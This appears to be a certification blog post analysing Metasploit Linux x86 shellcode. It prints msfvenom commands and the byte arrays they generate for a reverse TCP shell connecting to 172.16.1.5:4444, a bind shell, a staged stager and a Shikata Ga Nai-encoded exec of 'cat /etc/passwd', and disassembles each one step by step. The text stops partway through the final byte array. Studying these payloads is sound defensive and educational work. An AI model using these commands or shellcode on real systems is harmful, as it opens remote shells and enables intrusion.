---
layout: post
title: Metasploit Framework Payload Analysis
---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:*

*http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/*

*Student ID: SLAE - 1187*

Introduction
============

The most common source of shellcode payloads in the real world is most likely the Metasploit Framework (MSF). It comes prepackaged with a wide array of prefabricated and pre-optimized shellcodes and encoders for a large variety possible platforms and situations. These are generated on demand and can handle pretty much any requirements you have, especially bad characters, which the encoders handle beautifully. As such, it is an extremely valuable tool for anyone doing exploit development or penetration testing. 

While MSF's payloads are generally considered to be trustworthy, alternative sources of shellcode may not be. Sites such as shell-storm.org and exploit-db.com offer community submitted shellcodes that, while often are fine, sometimes are not. When you use a shellcode that you did not write, you are running code that could be potentially malicious. Now that sounds like a weird contradiction, but there is a long history of public payloads that don't work exactly as intended by the user. Some of them phone home and provide a shell to not only you but the author. Some of them just try to nuke the system they're ran on. The PWK course speaks of a public exploit that when ran, instead of exploiting whatever bug it claimed to, would connect to an IRC channel, send the user's IP address, and mock them. 

To avoid situations like this, we should always examine the exploits and shellcodes we plan to use but did not write ourselves. In this article we'll be discussing examining sellcodes and we'll do this through the lens of Metasploit payloads. 

Using MSF
=========

There are several ways to generate payloads using Metasploit. If you have an old version, you'd be using `msfpayload` and `msfencode`. These options are deprecated, and do not work on newer MSF versions and newer versions of Kali. You can also do payloads from `msfconsole`. This is where you'll be interacting with them if you are running metasploit modules. 

The method we'll be using is invoking `msfvenom`. This is the current method for interacting with metasploit payloads and encoders outside the context of a metasploit module. 

First, we'll want to get the lay of the land in terms of payloads available. To query MSF for the payloads available, run `msfvenom -l payloads`. Doing this alone will likely produce an overwhelming list of payloads. To narrow it down, we can simply grep the output. Today we'll be looking at linux payloads on the x86 platform. To do this simply, run `msfvenom -l payloads | grep x86 | grep linux`. 

```
root@mountain:~# msfvenom -l payloads | grep x86 | grep linux
    linux/x86/adduser                                   Create a new user with UID 0
    linux/x86/chmod                                     Runs chmod on specified file with specified mode
    linux/x86/exec                                      Execute an arbitrary command
    [...Output Omitted...]
```

These payloads are themselves metasploit modules, and as such have options associated with them. 

To list the options available for a payload, simply select the payload with `-p <payload>` and provide the `--payload-options` flag. 

```
root@mountain:~# msfvenom -p linux/x86/shell_reverse_tcp --payload-options
Options for payload/linux/x86/shell_reverse_tcp:


       Name: Linux Command Shell, Reverse TCP Inline
     Module: payload/linux/x86/shell_reverse_tcp
   Platform: Linux
       Arch: x86
Needs Admin: No
 Total size: 68
       Rank: Normal

Provided by:
    Ramon de C Valle <rcvalle@metasploit.com>
    joev <joev@metasploit.com>

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
CMD    /bin/sh          yes       The command string to execute
LHOST                   yes       The listen address
LPORT  4444             yes       The listen port

Description:
  Connect back to attacker and spawn a command shell
[...]
```

Payload options are specified by passing them in the format `<option>=<value>` after specifying the payload. Any option that is required but is not set by default must be passed a value. In this reverse shell payload, we must set an `LHOST`, the address the payload will connect back to. We'll also set an `LPORT` which is set by default to `4444`. 

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.1.5 LPORT=1337`

If we were to run this command right now, it would dump the bytes of the payload to our console. This is undesirable. We most likely want to provide this as part of another exploit. We can have msfvenom provide us the payload to us in a format we can drop into the source of another program. This is done with the `-f` flag. MSF can provide payloads in two types of formats, executables and transforms.

To get the list of formats, run `msfvenom --help-formats`

```
root@mountain:~# msfvenom --help-formats
Executable formats
	asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
Transform formats
	bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```

Transforms dump the shellcode out in a format that's compatible with a number of programming languages. For example we can do `-f c` to have the payload output with the dressings needed to paste it directly into a C source. We can also use the `-v` name to set the variable that is outputted with the payload. 

```
root@mountain:~# msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f c -v evil
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 312 bytes
unsigned char evil[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xac\x10\x01\x05\x68"
"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

Executables provide fully built executable formats for different systems. For example, `elf` and `exe` will provide us with a Linux ELF file and a Windows PE file respectively. These can be used with the `-o` flag to output to a file. 

```
root@mountain:~# msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f elf -o evil.elf
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes
Saved as: evil.elf
```

At this point we can also consider specifying an encoder. Because we haven't done so thus far MSF has dumped the raw payload without any kind of encoding. The most common encoder in MSF is `x86/shikata_ga_nai`. Use the `-e` flag as you would the `-p` flag to specify the encoder. Use the `-i` flag along with an integer to specify the number of times to encode the payload. The first iteration will encode the real payload and attach a decoder stub. The second will encode the encoded payload plus its decoder stub and attach its own decoder stub. So on and so forth.

 You can also specify bad characters for the encoder to try and avoid with the `-b` flag. To use the `-b` flag you specify in quotes the C style hex escaped characters you'd like it to avoid, `-b "\x00\x22\x41"` will avoid `\x00`, `\22`, and `\41`. This can be unreliable, payloads will often be rejected and regenerated if bad characters are found. The format of this flag is important, single quotes will not work, they must be double. 

```
root@mountain:~# msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f c -v evil -e x86/shikata_ga_nai -i 4 -b "\x00\x22\x41"
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 4 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai succeeded with size 122 (iteration=1)
x86/shikata_ga_nai succeeded with size 149 (iteration=2)
x86/shikata_ga_nai succeeded with size 176 (iteration=3)
x86/shikata_ga_nai chosen with final size 176
Payload size: 176 bytes
Final size of c file: 765 bytes
unsigned char evil[] = 
"\xba\xe8\xdc\xda\x8a\xdb\xdc\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x26\x83\xc0\x04\x31\x50\x0f\x03\x50\xe7\x3e\x2f\x30\x70\x56"
"\x11\x99\xa4\x64\x4b\x56\x7c\x9f\x37\xa4\xb5\xee\xd7\x49\xae"
"\xed\xd9\x1e\x20\x0d\x49\xb1\x25\x0c\x16\xfb\xa6\x10\xec\x53"
"\xb6\x0b\x6d\xc9\x92\x16\x2e\xb4\x3f\x77\x13\xa1\x6f\x0b\x7c"
"\x5f\xd6\xd4\xde\xf3\xd6\x8d\xc6\xdd\x19\xc4\xbc\xc3\x9f\x4e"
"\xde\x20\xff\x45\x1c\xa2\x93\x17\xab\xff\x6c\x0d\xae\xa6\x6e"
"\xe8\xb5\x8b\x5a\x4c\x78\xaa\xdc\x08\xa7\x7c\xfa\x9f\x69\xe9"
"\xe4\xac\xb1\xd9\x1b\x24\xab\x8a\x2c\x9f\x52\x05\xc2\xfc\x3a"
"\x7d\xa7\x2b\x0b\xa8\x92\x33\x65\x42\xb4\x73\xdc\x75\x0b\x03"
"\x49\xb7\xf2\x47\x71\xed\xa2\xd9\x0e\x67\x1a\xc6\x3e\x70\xe5"
"\xea\xc4\x7e\x8e\xaa\x6c\x64\x86\x7c\x04\x70";
```

Examining Payloads
==================

I'll be discussing three different payloads generated by `msfvenom` with some different options.

 * `linux/x86/shell_bind_tcp`
   * This payload is unstaged and will be unencoded. We'll simply examine the raw payload. 
 * `linux/x86/shell/reverse_tcp`
   * This is a staged payload, we will not discuss the second stage, only the first stage loader. 
   
 * `linux/x86/exec`
   * We'll configure this payload to simply execute /bin/sh, but encode it with three iterations of `x86/shikata_ga_nai`. It is my hope we'll be able to gain an understanding of how 'SGN' works. 
   
### Tools of the Trade

We'll primarily be using, `ndisasm`, `gdb`, and `libemu2` to examine these payloads. They are the most common tools for analyzing alien shellcodes and even light reverse engineering on Linux. 

Assuming a Debian based linux distribution, `gdb` should be installed with your system. `ndisasm` is part of the `nasm` package and `libemu2` is a package itself. To ensure all of these are installed, we can simply run `# apt install -y gdb nasm libemu2` as root or with `sudo` to get them installed. 

`ndisasm` allows us to disassemble binary data into the assembly instructions they represent. We can combine it with `echo -e` to pass `ndisasm` hex escaped bytes on standard input. We should also set the -u flag set ndisasm to 32 bit mode (as opposed to the default 16 bit mode).  

```
root@mountain:~# echo -ne "\x39\x40\x41\x42\x43" | ndisasm - -u
00000  394041            cmp [bx+si+0x41],ax
00000003  42                inc dx
00000004  43                inc bx

```

`gdb` is a debugger for a variety of CPUs that allows us to step through compiled/assembled programs and scrutinize every detail. Use of `gdb` is out of the scope of this post, however I'll try to explain some bare basics as I go along. We'll be using the shellcode host C program and compiling it with the shellcode to run GDB on it.

`libemu2` provides a script, `sctest` that will simulate and graph the execution of a shellcode. We simply feed it the bytes of a payload and it will test it. This is done similarly to how we pass bytes through stdin with `ndisasm`. We simply echo the escapes bytes with `echo -ne` and pipe it into sctest. The following example command will test the shellcode bytes echoed, output a dotfile, convert the dotfile to a png, and save the `sctest` output to a text file.  

```
# echo -ne "\x41\x41\x41\x41\x41\x41" | sctest -vvv -Ss 100000 -G dotfile.dot | tee sctest_output.txt && dot dotfile.dot -Tpng > shellcode_graph.png 
```

Analysis
========

## 1. linux/x86/shell_bind_tcp

First up we'll generate a plain, unencoded, unstaged Linux x86 bind shell payload on port 4444. To do this, we run the following:

```
root@mountain:~# msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 78 bytes
Final size of c file: 354 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";

```

We've selected the C format as it is the most basic. We'll clean it up in a text editor such as vim to get all as one string. Here are the cleaned hex escaped bytes of the payload we've generated:

```
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

We can immediately notice something interesting about this payload. There is a null byte, which would cause this payload to outright fail if it were to be used in this form in an actual exploit. Metasploit payloads practically expect to be passed through an encoder of some kind. In fact, if we were to set any bad characters with the `-b` flag, it would automatically select an encoder (usually `x86/shikata_ga_nai`) and run it through. 
 
We can echo this into `ndisasm` to get a simple disassembly of the bytes.   
```
root@mountain:~# echo -ne "\x31\xdb\xf7[...Omitted...]" | ndisasm - -u

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
[... output omitted ...]
```

I'll also generate some automated analysis through `sctest`. Its output is quite verbose, so I'll only discuss some of the more interesting or useful parts. 

```
root@mountain:~# echo -ne "\x31\xdb\xf7[...Omitted...]" | sctest -vvv -Ss 100000 -G shell_bind_tcp.dot | tee shell_bind_tcp_sctest.txt && dot shell_bind_tcp.dot -Tpng > shell_bind_tcp.png
```
This will generate a number of files, including a graph and a text file with the full sctest output. These can be found [in my git repo for the SLAE.](https://github.com/fbcsec/slae-assignments/tree/master/5-msf-shellcode-analysis/shell_bind_tcp)

### Short GDB Tutorial

To debug the shellcode we'll insert it into a [sellcode host](https://github.com/fbcsec/slae-assignments/blob/master/templates/shellcode_host.c) written in C and compile it to a 32 bit ELF file. We can then execute this or analyze it in GDB. Refer to my article on TCP bind shells for discussion on how this is done.

GDB is a powerful debugger for multiple operating systems and cpu architectures. To start gdb simply run `gdb` and point it to the file you want to debug. 

`root@mountain:~# gdb ./shell_bind_tcp_host.elf`

GDB will present us with a prompt. The first thing I want to do is set the disassembly flavor from `att` to `intel`. This can automatically be done by adding the command to the .gdbinit file in your home directory.

```
(gdb) set disassembly-flavor intel
```
 At this point our program is not running. If we tried to run it, it would just fly straight through it and execute normally. To stop it for analysis we need to set breakpoints. C programs like the shellcode host we're using always start by running the `main()` function. We can analyze the instructions of this function by running `disassemble main`.  
 
```
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000054d <+0>:	lea    ecx,[esp+0x4]
   0x00000551 <+4>:	and    esp,0xfffffff0
   0x00000554 <+7>:	push   DWORD PTR [ecx-0x4]
   0x00000557 <+10>:	push   ebp
   0x00000558 <+11>:	mov    ebp,esp
   [...]
   0x00000595 <+72>:	mov    DWORD PTR [ebp-0xc],eax
   0x00000598 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0000059b <+78>:	call   eax
   0x0000059d <+80>:	mov    eax,0x0
   [...]
```

Assuming you're using the shellcode host in my git repo, you'll want to look for a `call eax` instruction somewhere around `<main + 78>` and set a breakpoint. Breakpoints will cause the debugger halt execution when it reaches them. Right now we can set a breakpoint on the offset from main we want to stop at. In this case, the `call eax` we want to stop on is at `*main+78`. To set the breakpoint run the following:

```
(gdb) break *main+78
Breakpoint 1 at 0x59b
```

Now when we run the program it will stop at this instruction and we can take control. To run the program simply type `run`. 

```
(gdb) run
Starting program: shell_bind_tcp_host.elf 
Shellcode length: 20

Breakpoint 1, 0x5655559b in main ()
(gdb)
```

We've hit our breakpoint and are given a prompt. From here we can step through the program by running `si`
```
(gdb) si
0x56557020 in shellcode ()
```

and analyze register state by running `info registers`

```
(gdb) info registers
eax            0x56557020	1448439840
ecx            0x15	21
edx            0xf7f9b894	-134629228
ebx            0x56556fd4	1448439764
esp            0xffffcefc	0xffffcefc
ebp            0xffffcf18	0xffffcf18
esi            0x1	1
edi            0xf7f9a000	-134635520
eip            0x56557020	0x56557020 <shellcode>
eflags         0x286	[ PF SF IF ]
[...]
(gdb) 
```

We can also examine memory locations with `x`, for instructions on using `x` type `help x` For example to examine the first 8 bytes of the stack:

```
(gdb) x/8b $esp
0xffffcefc:	0x9d	0x55	0x55	0x56	0x01	0x00	0x00	0x00
```

### Stepping Through linux/x86/shell_bind_tcp

```nasm
xor ebx,ebx
mul ebx
```

If you've been reading through my SLAE articles this trick should look familiar. It does the wonderful job of nulling out three registers in two instructions; EBX with the first XOR instruction, and EAX and EDX with the MUL.

```nasm
push ebx
inc ebx
push ebx
push byte +0x2
mov ecx,esp
mov al,0x66
int 0x80
```

This block builds fires a `socket(2)` Linux syscall. As discussed in my TCP bind shell article, system calls are made by MOVing the syscall ID into EAX and the arguments into EBX, ECX, EDX, ESI, and EDI. Linux socket system calls are exposed through a single syscall, `socketcall(2)`, with the id `0x66`. Its arguments are the socket syscall ID in EBX and a pointer to an array of arguments to be provided to the socket function. Refer to my TCP Bind Shell article for further details on system calls and Linux socket programming.

Here the arguments `[2, 1, 0]` for `socket(2)` are pushed to the stack in reverse order. EBX is also incremented to `0x01` (the socketcall ID for `socket(2)`) Then we copy ESP, now a pointer to the arguments, into ECX, set EAX to `0x66` (the syscall ID) for `socketcall(2)`. Finally, interrupt `0x80` is fired to execute the system call.

Analyzing the state of the program in gdb after the `int 0x80` shows us that EAX has changed from `0x66` to, in my case, `0x03`. This indicates to us that the call was successful (It didn't return a negative number). 

```
(gdb) info reg
eax            0x3	3
ecx            0xffffcef0	-12560
edx            0x0	0
ebx            0x1	1
esp            0xffffcef0	0xffffcef0
ebp            0xffffcf18	0xffffcf18
esi            0x1	1
edi            0xf7f9a000	-134635520
```

The return value in EAX is a file descriptor for the new socket. 

```nasm
pop ebx
pop esi
```
Now `0x02` is popped from the stack into EBX, this is the socketcall id for `bind(2)`. Then `0x01` is popped from the stack into ESI. There is now a null (0x00) at the top of the stack. The next few instructions will push a data structure to the stack. The POP to ESI has the effect of pre-aligning the finished structure with the memory that ECX is pointing to.

```nasm
push edx
push dword 0x5c110002
```

The sockaddr struct gets pushed to the stack here. EDX is still zero so the listen address at the end of the structure is pushed first (listening on zero listens on all IP addresses), then the port number in network byte order combined with the address family is pushed. ECX is now a pointer to this structure.  

```nasm
push byte +0x10
push ecx
push eax
```

The `bind(2)` arguments are set up on the stack. First the length of the sockaddr struct that was built, then the pointer in ECX, and the socket file descriptor to bind to. 

```nasm
mov ecx,esp
push 0x66
pop eax
int 0x80
```

Now the `socketcall(2)` call is finally made. The pointer to the argument array is copied from ESP into ECX. A nice4 trick for writing values that would otherwise have produced nulls is used here. The value is pushes to the stack and then popped into EAX. This is done because there is no guarantee of what value will have been returned in EAX from `socket(2)`. When the PUSH instruction is used it either must by 16 bits or 32 bits of data. If the data pushed is not this big the upper bytes are zeroed. By PUSHing 0x66 what really happens is a PUSH DWORD 0x00000066. A WORD can also be pushed but not a BYTE.

```nasm
mov [ecx+0x4],eax
mov bl,0x4
mov al,0x66
```

At the start of this section ECX is pointing to a block of memory that looks like this:

```
0xffffcee4:	0x00000003	0xffffcef0	0x00000010	0x5c110002
```

The next call to be made, `listen(2)`, will re-use this memory. `listen(2)` requires a socket file descriptor and a backlog value. The shellcode overwrites the old pointer to the sockaddr struct (the 0xffcef0 value) with the return value of `bind(2)`, which should be zero. This zeroes the memory location. 
```
0xffffcee4:	0x00000003	0x00000000	0x00000010	0x5c110002
```

The shellcode goes on to make a the `listen(2)` call with this memory as its arguments. Recall that the socket file descriptor is still at the memory pointed to by ECX from the last call to `bind(2)`. 

```nasm
inc ebx
mov al,0x66
int 0x80
```

These next few instructions simply prepare and make an `accept(2)` call. This code is executed when the operating system returns from `listen(2)`. Nothing is done except bumping EBX to set the socketcall ID and setting the syscall id. 

```nasm
xchg eax,ebx
pop ecx
```

`accept(2)` returns a new file descriptor representing the connection that was just accepted. The shellcode will proceed to make a series of `dup2(2)` calls, and the file descriptor the be duplicated to needs to be in EBX. 

The series of `dup2(2)` calls will copy stdin, stdout, and stderr to the FD returned by `accept(2)`. This will be done in a loop. The file descriptors that must be duplicates are 0, 1, and 2. Conveniently, there is a `0x03` on the stack that can just be popped into ECX. 

```nasm
push byte +0x3f
pop eax
int 0x80
dec ecx
jns 0x32
```

This block is the `dup2(2)` loop. This uses the same trick above of PUSHing a value to the stack and then popping it off to move that value in without producing any leading null bytes. This sets the `dup2(2)` syscall ID ino EAX. Then it fires the syscall with what was put into EBX and ECX before entering the loop. Then ECX is decremented. From here, if the decrement would cause ECX to become signed (i.e. less than zero) it proceeds, if not it loops back to the initial `push byte +0x3f` instruction. 

 ```nasm
push dword 0x68732f2f ; hs//
push dword 0x6e69622f ; nib/
mov ebx,esp
push eax
push ebx
mov ecx,esp
mov al,0xb
int 0x80
```

When the loop is exited, it builds and makes an `execve(2)` call. This is done by pushing `/bin//sh` backwards and in reverse order. The rest is building the requisite arrays for execve arguments on the stack and firing the call. At this point whoever's connected will be presented with a shell. 

## 2. linux/x86/shell/reverse_tcp Stage 1 Unencoded

Next we'll discuss the first stage of a staged shellcode payload. Specifically `linux/x86/shell/reverse_tcp`'s stager. Staged shellcodes come in two parts. The first stage, or 'stager' is designed to receive or acquire a larger second stage and then pass execution to it. This helps with exploitation scenarios that involve more limited space for payloads, or are limited in the characters that can be used. An egghunter could be considered a stager. This first stage payload connects back and receives the second stage from us. 
 
Just as before I'll generate the shellcode, clean up the output, and analyze it. 

```
root@mountain:~# msfvenom -p linux/x86/shell/reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f c
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of c file: 543 bytes
unsigned char buf[] = 
"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89"
"\xe1\xcd\x80\x97\x5b\x68\xac\x10\x01\x05\x68\x02\x00\x11\x5c"
"\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0"
"\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05"
"\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9"
"\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd"
"\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80"
"\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00"
"\x00\xcd\x80";
```

```
"\x6a\x0a\x5e\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80\x97\x5b\x68\xac\x10\x01\x05\x68\x02\x00\x11\x5c\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85\xc0\x79\x19\x4e\x74\x3d\x68\xa2\x00\x00\x00\x58\x6a\x00\x6a\x05\x89\xe3\x31\xc9\xcd\x80\x85\xc0\x79\xbd\xeb\x27\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80"
```

We can already see, again, MSF's reliance on encoders. This raw payload is *full* of nulls. So much so that I question the use of this staged payload, considering the size of an encoded and  unstaged reverse shell payload is similarly sized.

I also run the following to dynamically generate analysis and a graph with sctest. 

```
root@mountain:~# echo -ne "\x61\x0a\x53[...omitted...]" | sctest -vvv -Ss 10000 -G staged_shell_reverse_tcp.dot | tee sctest_staged_shell_reverse_tcp.txt && dot staged_shell_reverse_tcp.dot -Tpng > staged_shell_reverse_tcp.png
```

Because this payload requires a host to connect back to and deliver a second stage notice that the graph stops short after a call to `connect(2)`. 

The files generated during my analysis can be found [here](https://github.com/fbcsec/slae-assignments/tree/master/5-msf-shellcode-analysis/staged_shell_reverse_tcp)

### Stepping through the stager

This shellcode has three primary steps. First, it attempts to connect back to the address and port specified in LPORT and LHOST. If it fails it waits a few seconds and retries a number of times. Then it uses mprotect(2) to set a large section of stack memory to be readable, writable, and executable. Finally it reads bytes from the connection into the memory region that was set to RWX and passes execution to whatever is in there. If any of these steps fail, it attempts to gracefully exit with an exit(2) syscall. 

```nasm
push byte 0xa 
pop esi       
xor ebx,ebx   
mul ebx       
```

First this shellcode does some initial setup. Using the PUSH POP method to move 0x0A into ESI and zero EAX, EBX, and EDX. ESI will be used as a counter for connection attempts. 

```nasm
; socket(2)
push ebx     
inc ebx      
push ebx     
push byte 0x2
mov al,0x66  
mov ecx,esp  
int 0x80     
```

Next a pretty normal `socketcall(2)` to `socket(2)` is made. This returns a file descriptor in EAX. 

```nasm
xchg eax,edi
pop ebx     
```

The socket file descriptor in EAX is XCHG-ed into EDI and 0x02 is popped into EBX for the next `socketcall(2)` to `connect(2)`. 

```nasm
push dword 0x50110ac 
push dword 0x5c110002
mov ecx,esp          
```
A sockaddr struct (two bytes of protocol family, two bytes of port number, and four bytes of destination IP address) is built on the stack and the pointer to it is saved in ECX.

```nasm
push byte 0x66
pop eax
push eax      
push ecx      
push edi      
mov ecx,esp   
inc ebx       
int 0x80      
```
Now the rest of the the `connect(2)` call is made. PUSH POP is used to put the socketcall ID into EAX, and then the ID is pushed back as the length of the sockaddr struct. Then the pointer to the sockaddr struct, and the file descriptor are pushed. The pointer to these arguments are moved into ECX, EBX is incremented to the socketcall id for `connect(2)` and the syscall is made.

```nasm
test eax,eax
jns 0x48    
dec esi     
jz 0x6f     
```

The call to `connect(2)` should return zero, and the shellcode tests for this here. If it does return zero, it JMPs into a call to `mprotect(2)`. This is done by using the TEST instruction on EAX. TEST checks if the 31st bit is set and sets the sign flag to 1 if so and zero if not. JNS JMPs if the sign flag is not zero. If a syscall returns a signed, negative value it is returning an ERRNO, a clear indication of failure. If the sign flag is not set the jmp is taken. 

If the sign flag is set by test the ESI counter is decremented and a conditional JMP is evaluated. If ESI decrements to zero a JMP is taken to an exit(2) syscall at the end of the shellcode. 

```nasm
; nanosleep(2)
push dword 0xa2
pop eax        
push byte 0x0  
push byte 0x5  
mov ebx,esp    
xor ecx,ecx    
int 0x80       
```

Next a `nanosleep(2)` syscall is made. The first step is to PUSH/POP the syscall ID into EAX. `nanosleep(2)` requires two arguments, first a pointer to a 'timespec' struct. Timespec is defined as a dword of seconds and a dword of nanoseconds. These are pushed in reverse order to the stack (5 seconds and zero nanoseconds.) The pointer to this structure is saved to EBX. The second argument required is a memory address where `nanosleep(2)` can write the remaining time if interrupted. The shellcode will not use this and simply empty it with an XOR. 

```nasm
test eax,eax   
jns 0x3        
jmp short 0x6f 
```

Here, if nanosleep returns an error a JMP is taken to an `exit(2)` syscall at the end of the shellcode. If no error is returned JMP to the `XOR EBX, EBX` at the start of the shellcode. 

```nasm
mov dl,0x7      
mov ecx,0x1000  
mov ebx,esp     
shr ebx,byte 0xc
shl ebx,byte 0xc
mov al,0x7d     
int 0x80        
```

This is the JMP target after a successful `connect(2)` call. This makes an `mprotect(2)` call to change the permissions of a block of stack memory. This prepares the memory for a `read(2)` syscall to write the second stage shellcode. The arguments for this call are a pointer to the start of the memory region to alter, the amount of memory to alter, and a unix permission mask.

First the shellcode sets the permission argument, in most cases it's a unix permission mask so DL is set to 7 for read, write, and execute. Then it sets ECX to 0x1000 as the size of the memory region to modify. Then the stack pointer os moved into EBX. There is a SHR and an SHL which drops the right three bytes to the right. Then the shift left drops returns the bits to their initial position but zeroes the bits which were dropped off. 

For example

```
11111111111111111111111111111111
SHR 0x0C
00000000000011111111111111111111
SHL 0x0C
11111111111111111111000000000000
```

Then the syscall ID for `mprotect(2)` is moved into EAX and the syscall is fired. 

```
test eax,eax
js 0x6f     
```
As with the last few calls the return value is tested for signedness and if the call returned a failure JMP to an `exit(2)` syscall. 

```nasm
pop ebx    
mov ecx,esp
cdq        
mov dh,0xc 
mov al,0x3 
int 0x80   
```

The shellcode now builds and executes a `read(2)` syscall. `read(2)`'s arguments are a file descriptor to read from, a pointer to memory to read into, and the amount of data to read in. To do this the the file descriptor still on the top of the stack from `connect(2)` is POPped into EBX. Then the stack pointer, as the region to write into, is moved into ECX. The `cdq` instruction is interesting here. It takes the 31st bit of EAX and stretches it across EDX. Since EAX should be zeroed, EDX should now be zeroed. Then 0xc is moved into DH to tell `read(2)` to read 3072 bytes. Then the syscall ID for `read(2)` is moved into AL and the syscall is made. 

```nasm
test eax,eax
js 0x6f     
jmp ecx     
```

If the `read(2)` call returned an error, jump to an `exit(2)` call at the end of the shellcode, if no error was returned JMP to the memory that was written to by `read(2)` and pass execution to the stage 2 shellcode that was read from the connection. At this point the stage 2 shellcode should be executing. 

```nasm
mov eax,0x1
mov ebx,0x1
int 0x80   
```

The last few lines of the shellcode is an `exit(2)` syscall. This call's argument is simply the code to exit with. This is where all of those 'jump to an `exit(2)` call at the end of the shllcode' I mentioned above ends up. This gracefully exits. This graceful exit isn't just the shellcode, it's the application. By doing this the application that has been exploited with this shellcode will return the 1 instead of hitting some kind of error such as a segfault that could result in a core dump with evidence of our exploitation. 

## Shikata Ga Nai encoded linux/x86/exec

The third shellcode we'll analyze is linux/x86/exec encoded with shikata ga nai (SGN). The subject of this analysis is going to be more targeted at the SGN decoder stub. We wil touch on the actual `exec` shellcode, however it was chosen as it would be a simple shellcode to apply SGN to. 

Generating the shellcode:

```
root@mountain:~# msfvenom -p linux/x86/exec CMD="cat /etc/passwd" -f c -e x86/shikata_ga_nai
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 78 (iteration=0)
x86/shikata_ga_nai chosen with final size 78
Payload size: 78 bytes
Final size of c file: 354 bytes
unsigned char buf[] = 
"\xd9\xe9\xba\x33\xd4\x7e\x78\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x0d\x31\x55\x1a\x83\xed\xfc\x03\x55\x16\xe2\xc6\xbe\x75\x20"
"\xb1\x6d\xec\xb8\xec\xf2\x79\xdf\x86\xdb\x0a\x48\x56\x4c\xc2"
"\xea\x3f\xe2\x95\x08\xed\x12\xb5\xce\x11\xe3\xd5\xaf\x65\xc3"
